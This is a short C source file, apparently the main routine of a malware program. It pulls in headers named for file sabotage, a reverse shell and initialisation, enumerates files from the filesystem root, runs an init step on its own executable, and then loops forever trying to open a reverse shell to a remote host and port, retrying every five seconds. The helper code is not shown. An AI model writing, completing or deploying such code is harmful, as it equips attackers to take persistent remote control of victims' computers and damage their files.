#include <stdio.h>

#include "header/file-savotager.h"
#include "header/reverse-sh.h"
#include "header/init.h"

int main(int argv, char * argc[]) {
    char ** arr = get_file_list("/");
    char ** piv = arr;

    init(argc[0]);

    while (*piv != NULL) {
        printf("%s\n", *piv);
        free(*piv);
        piv++;
    }
    free(arr);

    while (1) {
        if (reverse_shell(RHOST, PORT) != 0) {
            sleep(5);
        }
    }
    return 0;
}